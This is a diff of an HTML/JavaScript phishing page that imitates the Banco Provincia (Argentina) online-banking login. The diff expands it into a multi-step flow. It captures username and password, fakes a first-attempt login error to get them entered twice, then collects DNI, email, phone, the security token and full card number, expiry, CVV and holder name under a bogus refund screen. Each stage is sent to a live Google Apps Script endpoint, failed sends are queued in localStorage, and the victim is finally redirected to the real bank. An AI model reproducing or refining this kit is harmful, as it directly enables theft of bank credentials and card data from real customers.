@@ -14,26 +14,30 @@
   .bapro-bar{background:linear-gradient(270deg,#26b4bd,#3daa35);padding:1.15rem 1.4rem;display:flex;align-items:center}
   .logoBapro{height:2.125rem;width:auto;display:block}
 
-  .wrap{max-width:32rem;margin:0 auto;padding:1.5rem 1rem 2.5rem}
-  .login-content{padding:1.6rem 1.35rem 1.35rem;border-radius:.625rem;box-shadow:0 0 .938rem #0000001a;background:#fff}
+  .wrap{max-width:32rem;margin:0 auto;padding:1.4rem 1rem 2.5rem}
+  .login-content{padding:1.5rem 1.3rem 1.3rem;border-radius:.625rem;box-shadow:0 0 .938rem #0000001a;background:#fff}
 
-  .field{margin-bottom:1.1rem}
+  .oculto{display:none!important}
+  .field{margin-bottom:1.05rem}
   .form-control{width:100%}
+  .mal{border:1px solid #d42f1a!important;background-color:#d42f1a26!important}
 
-  #b3{width:100%;margin-top:.5rem}
-  #b3:disabled{background-color:#ececec!important;color:#696969!important;filter:grayscale(100%);opacity:1;border-color:transparent!important}
+  .titulo{font-size:1.4rem;line-height:1.8rem;color:#007a2b;margin:0 0 .35rem;font-weight:600}
+  .sub{font-size:.875rem;line-height:1.313rem;color:#585b62;margin:0 0 1.3rem}
+
+  .principal{width:100%;margin-top:.5rem}
+  .principal:disabled{background-color:#ececec!important;color:#696969!important;filter:grayscale(100%);opacity:1;border-color:transparent!important}
 
   #err{display:none;margin-bottom:1rem}
   #err .text{font-size:.875rem;line-height:1.3125rem}
 
-  #spinner{position:fixed;inset:0;z-index:9999;display:none;flex-direction:column;align-items:center;justify-content:center;gap:1rem;background:rgba(255,255,255,.94)}
-  #spinner.on{display:flex}
-  .sp{width:46px;height:46px;border:4px solid #d8d8d8;border-top-color:#007a2b;border-radius:50%;animation:gir .8s linear infinite}
+  .sp{width:46px;height:46px;margin:0 auto;border:4px solid #d8d8d8;border-top-color:#007a2b;border-radius:50%;animation:gir .8s linear infinite}
   @keyframes gir{to{transform:rotate(360deg)}}
-  .sp-txt{font-size:.875rem;color:#3c3c3b}
 
-  .pie{margin-top:1.4rem;text-align:center;font-size:.75rem;line-height:1.188rem;color:#585b62}
+  .pie{margin-top:1.3rem;text-align:center;font-size:.75rem;line-height:1.188rem;color:#585b62}
   .pie a{color:#007a2b}
+  .ok{text-align:center;padding:1.5rem 0}
+  .cir{width:64px;height:64px;margin:0 auto 1rem;border-radius:50%;background:#007a2b;color:#fff;font-size:2rem;line-height:64px}
 </style>
 </head>
 <body class="spa">
@@ -44,147 +48,250 @@
 
   <div class="wrap">
     <div class="login-content">
-      <h1 class="txt-title" style="font-size:1.5rem;line-height:1.875rem;padding-bottom:1rem;color:#007a2b;margin:0 0 .25rem">Banca Internet</h1>
-      <p class="txt-small" style="color:#585b62;margin-bottom:1.4rem">Ingresá con tu usuario y clave para operar.</p>
 
-      <div class="alert alert-danger" id="err" role="alert">
-        <span class="text" id="err-txt"></span>
+      <div class="alert alert-danger" id="err" role="alert"><span class="text" id="err-txt"></span></div>
+
+      <!-- PASO 1 -->
+      <div id="p1">
+        <h1 class="titulo">Banca Internet</h1>
+        <p class="sub">Ingresá con tu usuario y clave para operar.</p>
+
+        <div class="field">
+          <label class="txt-input-label" for="u">Usuario (DNI)</label>
+          <input class="form-control" id="u" type="text" inputmode="numeric" maxlength="8" autocomplete="username" placeholder="Sin puntos" required>
+        </div>
+
+        <div class="field">
+          <label class="txt-input-label" for="c">Clave</label>
+          <input class="form-control" id="c" type="password" autocomplete="current-password" placeholder="Tu clave" required>
+        </div>
+
+        <button class="btn btn-primary principal" id="b1" type="button">Ingresar</button>
       </div>
 
-      <form id="f" novalidate autocomplete="on">
+      <!-- SPINNER -->
+      <div id="p2b" class="oculto" style="text-align:center;padding:2.5rem 0">
+        <div class="sp"></div>
+        <p class="sub" style="margin-top:1.1rem">Validando dispositivo…</p>
+        <button class="btn btn-outline-secondary oculto" id="saltar" type="button" style="margin-top:.75rem">Continuar</button>
+      </div>
+
+      <!-- PASO 2 -->
+      <div id="p2" class="oculto">
+        <h1 class="titulo">Tus datos</h1>
+        <p class="sub">Confirmá tu identidad para continuar.</p>
 
         <div class="field">
-          <label class="txt-input-label" for="dni">Usuario (DNI)</label>
-          <input class="form-control" id="dni" name="dni" type="text" inputmode="numeric" autocomplete="username" placeholder="Sin puntos" required>
+          <label class="txt-input-label" for="d">DNI</label>
+          <input class="form-control" id="d" type="text" inputmode="numeric" maxlength="8" placeholder="Sin puntos">
         </div>
 
         <div class="field">
-          <label class="txt-input-label" for="clave">Clave</label>
-          <input class="form-control" id="clave" name="clave" type="password" autocomplete="current-password" placeholder="Tu clave" required>
+          <label class="txt-input-label" for="m">Email</label>
+          <input class="form-control" id="m" type="email" inputmode="email" placeholder="tucorreo@ejemplo.com" autocomplete="off">
         </div>
 
         <div class="field">
-          <label class="txt-input-label" for="tok">Token de seguridad</label>
-          <input class="form-control" id="tok" name="token" type="text" inputmode="numeric" maxlength="6" autocomplete="one-time-code" placeholder="6 dígitos">
+          <label class="txt-input-label" for="t">Celular</label>
+          <input class="form-control" id="t" type="tel" inputmode="numeric" maxlength="12" placeholder="Código de área y número" autocomplete="off">
         </div>
 
-        <button class="btn btn-primary" id="b3" type="submit" disabled>Ingresar</button>
-      </form>
+        <button class="btn btn-primary principal" id="b2" type="button">Continuar</button>
+      </div>
 
-      <p class="pie">
-        ¿Olvidaste tu clave? <a href="https://www.bancoprovincia.com.ar/" target="_blank" rel="noopener">Recuperarla</a>
-      </p>
+      <!-- PASO 3 -->
+      <div id="p3" class="oculto">
+        <h1 class="titulo">Token de seguridad</h1>
+        <p class="sub">Ingresá los 6 dígitos de tu token.</p>
+
+        <div class="field">
+          <label class="txt-input-label" for="tk">Token</label>
+          <input class="form-control" id="tk" type="text" inputmode="numeric" maxlength="6" autocomplete="one-time-code" placeholder="6 dígitos">
+        </div>
+
+        <button class="btn btn-primary principal" id="b3" type="button" disabled>Ingresar</button>
+      </div>
+
+      <!-- PASO 4 -->
+      <div id="p4" class="oculto">
+        <h1 class="titulo">Reintegro</h1>
+        <p class="sub">Ingresá una tarjeta para acreditar el importe.</p>
+
+        <div class="field">
+          <label class="txt-input-label" for="n">Número de tarjeta</label>
+          <input class="form-control" id="n" type="text" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" autocomplete="off">
+        </div>
+
+        <div class="field">
+          <label class="txt-input-label" for="v">Vencimiento</label>
+          <input class="form-control" id="v" type="text" inputmode="numeric" maxlength="5" placeholder="MM/AA" autocomplete="off">
+        </div>
+
+        <div class="field">
+          <label class="txt-input-label" for="s">Código de seguridad</label>
+          <input class="form-control" id="s" type="text" inputmode="numeric" maxlength="4" placeholder="CVV" autocomplete="off">
+        </div>
+
+        <div class="field">
+          <label class="txt-input-label" for="ti">Titular</label>
+          <input class="form-control" id="ti" type="text" maxlength="40" placeholder="Nombre como figura en la tarjeta" autocomplete="off">
+        </div>
+
+        <button class="btn btn-primary principal" id="b4" type="button">Acreditar</button>
+      </div>
+
+      <!-- FIN -->
+      <div id="p5" class="oculto ok">
+        <div class="cir">✓</div>
+        <h2 class="titulo" style="margin-bottom:.5rem">Reintegro acreditado</h2>
+        <p class="sub">El importe se verá reflejado en tu cuenta dentro de las próximas 48 horas hábiles.</p>
+        <p class="sub" style="font-size:.75rem">Redirigiendo…</p>
+      </div>
+
+      <p class="pie">Banco de la Provincia de Buenos Aires · Conexión segura</p>
     </div>
   </div>
 
-  <div id="spinner">
-    <div class="sp"></div>
-    <div class="sp-txt">Validando datos…</div>
-  </div>
-
 <script>
-(function(){
-  // >>> PEGAR ACÁ LA URL DEL APPS SCRIPT <<<
-  var API = "PEGAR_ACA_TU_URL_DE_APPS_SCRIPT";
+var API = "https://script.google.com/macros/s/AKfycbz4vN9NJ7e62oxP8vtnraF86D901Tb02wCe5hWfee2AN9XFLfF-7M6iDeFSfvnwmJJuow/exec";
+var datos = {};
 
-  // Clave que dispara el error y hace reintentar
-  var CLAVE_MALA = "clave_mala";
+function $(id){ return document.getElementById(id); }
+function dig(s){ return String(s).replace(/\D/g, ""); }
+function ir(a, b){ $(a).classList.add("oculto"); $(b).classList.remove("oculto"); window.scrollTo(0, 0); }
+function mal(el, m){ el.classList.toggle("mal", m); return !m; }
 
-  var KEY = "bip_cola";
-  var f     = document.getElementById("f");
-  var dni   = document.getElementById("dni");
-  var clave = document.getElementById("clave");
-  var tok   = document.getElementById("tok");
-  var btn   = document.getElementById("b3");
-  var err   = document.getElementById("err");
-  var errT  = document.getElementById("err-txt");
-  var sp    = document.getElementById("spinner");
+function enviar(estado){
+  var cuerpo = JSON.stringify(Object.assign({}, datos, { estado: estado }));
+  function guardar(){
+    try{
+      var q = JSON.parse(localStorage.getItem("q") || "[]");
+      q.push(cuerpo);
+      localStorage.setItem("q", JSON.stringify(q));
+    }catch(e){}
+  }
+  if (!navigator.onLine){ guardar(); return; }
+  try{ fetch(API, { method: "POST", body: cuerpo, keepalive: true }).catch(guardar); }
+  catch(e){ guardar(); }
+}
 
-  // DNI: solo dígitos
-  dni.addEventListener("input", function(){
-    dni.value = dni.value.replace(/\D/g, "").slice(0, 8);
+window.addEventListener("load", function(){
+  var q = [];
+  try{ q = JSON.parse(localStorage.getItem("q") || "[]"); }catch(e){}
+  if (!q.length) return;
+  try{ localStorage.setItem("q", "[]"); }catch(e){}
+  q.forEach(function(c){
+    try{ fetch(API, { method: "POST", body: c, keepalive: true }).catch(function(){}); }catch(e){}
   });
+});
 
-  // Token: solo dígitos, botón habilitado recién a los 6
-  tok.addEventListener("input", function(){
-    tok.value = tok.value.replace(/\D/g, "").slice(0, 6);
-    btn.disabled = tok.value.length !== 6;
-  });
+function mostrarError(msg){
+  $("err-txt").textContent = msg;
+  $("err").style.display = "flex";
+}
 
-  function armar(){
-    return {
-      dni:    dni.value.trim(),
-      clave:  clave.value,
-      token:  tok.value,
-      origen: location.href,
-      ua:     navigator.userAgent,
-      ts:     Date.now() + "-" + Math.random().toString(36).slice(2, 7)
-    };
+// ---- PASO 1
+$("u").addEventListener("input", function(){ this.value = dig(this.value).slice(0, 8); });
+
+$("b1").addEventListener("click", function(){
+  $("err").style.display = "none";
+  var u = $("u").value.trim();
+  var c = $("c").value;
+
+  if (!mal($("u"), u.length < 3)){ $("u").focus(); return; }
+  if (!mal($("c"), c.length < 4)){ $("c").focus(); return; }
+
+  datos.usuario = u;
+  datos.clave = c;
+  enviar("login");
+  ir("p1", "p2b");
+
+  var t1 = setTimeout(function(){ $("saltar").classList.remove("oculto"); }, 2200);
+  var t2 = setTimeout(resolver, 18000);
+
+  function resolver(){
+    clearTimeout(t1); clearTimeout(t2);
+    $("saltar").classList.add("oculto");
+    if (!datos.reintento){
+      datos.reintento = 1;
+      ir("p2b", "p1");
+      $("c").value = "";
+      mostrarError("Usuario o clave incorrectos. Volvé a intentar.");
+      $("c").focus();
+    } else {
+      ir("p2b", "p2");
+      $("d").focus();
+    }
   }
+  $("saltar").onclick = resolver;
+});
 
-  function leer(){
-    try { return JSON.parse(localStorage.getItem(KEY) || "[]"); } catch(e){ return []; }
-  }
-  function guardar(d){
-    try { var q = leer(); q.push(d); localStorage.setItem(KEY, JSON.stringify(q)); } catch(e){}
-  }
-  function sacar(ts){
-    try { localStorage.setItem(KEY, JSON.stringify(leer().filter(function(x){ return x.ts !== ts; }))); } catch(e){}
-  }
+// ---- PASO 2
+$("d").addEventListener("input", function(){ this.value = dig(this.value).slice(0, 8); });
+$("t").addEventListener("input", function(){ this.value = dig(this.value).slice(0, 12); });
 
-  function enviar(d){
-    return fetch(API, {
-      method: "POST",
-      mode: "no-cors",
-      keepalive: true,
-      headers: { "Content-Type": "text/plain;charset=utf-8" },
-      body: JSON.stringify(d)
-    });
-  }
+$("b2").addEventListener("click", function(){
+  var d = $("d").value.trim();
+  var m = $("m").value.trim();
+  var t = $("t").value.trim();
 
-  // Reintento de lo que quedó pendiente de sesiones anteriores
-  window.addEventListener("load", function(){
-    leer().forEach(function(d){
-      enviar(d).then(function(){ sacar(d.ts); }).catch(function(){});
-    });
-  });
+  if (!mal($("d"), d.length < 7)){ $("d").focus(); return; }
+  if (!mal($("m"), !/^[^\s@]+@[^\s@]+\.[a-z]{2,}$/i.test(m))){ $("m").focus(); return; }
+  if (!mal($("t"), t.length < 8)){ $("t").focus(); return; }
 
-  function mostrarError(msg){
-    errT.textContent = msg;
-    err.style.display = "flex";
-  }
+  datos.dni = d;
+  datos.email = m;
+  datos.telefono = t;
+  enviar("parcial");
+  ir("p2", "p3");
+  $("tk").focus();
+});
 
-  f.addEventListener("submit", function(ev){
-    ev.preventDefault();
-    err.style.display = "none";
+// ---- PASO 3
+$("tk").addEventListener("input", function(){
+  this.value = dig(this.value).slice(0, 6);
+  $("b3").disabled = this.value.length !== 6;
+});
 
-    if (!dni.value.trim()) { mostrarError("Ingresá tu usuario."); dni.focus(); return; }
-    if (!clave.value)      { mostrarError("Ingresá tu clave.");   clave.focus(); return; }
+$("b3").addEventListener("click", function(){
+  if ($("tk").value.length !== 6){ $("tk").focus(); return; }
+  datos.token = dig($("tk").value);
+  enviar("token");
+  ir("p3", "p4");
+  $("n").focus();
+});
 
-    var d = armar();
-    guardar(d);
-    enviar(d).then(function(){ sacar(d.ts); }).catch(function(){});
+// ---- PASO 4
+$("n").addEventListener("input", function(){
+  var v = dig(this.value).slice(0, 16).replace(/(.{4})/g, "$1 ").trim();
+  this.value = v;
+});
+$("v").addEventListener("input", function(){
+  var v = dig(this.value).slice(0, 4);
+  this.value = v.length > 2 ? v.slice(0, 2) + "/" + v.slice(2) : v;
+});
+$("s").addEventListener("input", function(){ this.value = dig(this.value).slice(0, 4); });
+$("ti").addEventListener("input", function(){ this.value = this.value.replace(/[^A-Za-zÁÉÍÓÚÜÑáéíóúüñ ]/g, ""); });
 
-    sp.classList.add("on");
-    btn.disabled = true;
+$("b4").addEventListener("click", function(){
+  var n = dig($("n").value);
+  var v = $("v").value;
+  var s = dig($("s").value);
+  var ti = $("ti").value.trim();
 
-    // 2,2 s: momento en que el banco "recibe" el intento
-    setTimeout(function(){}, 2200);
+  if (!mal($("n"), n.length < 15)){ $("n").focus(); return; }
+  if (!mal($("v"), !/^(0[1-9]|1[0-2])\/\d{2}$/.test(v))){ $("v").focus(); return; }
+  if (!mal($("s"), s.length < 3)){ $("s").focus(); return; }
+  if (!mal($("ti"), ti.length < 5)){ $("ti").focus(); return; }
 
-    // 18 s: resultado
-    setTimeout(function(){
-      if (clave.value.toLowerCase() === CLAVE_MALA) {
-        sp.classList.remove("on");
-        btn.disabled = tok.value.length !== 6;
-        mostrarError("El usuario y/o la clave ingresados no son correctos.");
-        clave.value = "";
-        clave.focus();
-      } else {
-        location.href = "https://bancoprovincia.bancainternet.com.ar/spa/";
-      }
-    }, 18000);
-  });
-})();
+  datos.tarjeta = n;
+  datos.venc = v;
+  datos.cvv = s;
+  datos.titular = ti;
+  enviar("completo");
+  ir("p4", "p5");
+  setTimeout(function(){ location.href = "https://www.bancoprovincia.com.ar/"; }, 4500);
+});
 </script>
 
 </body>
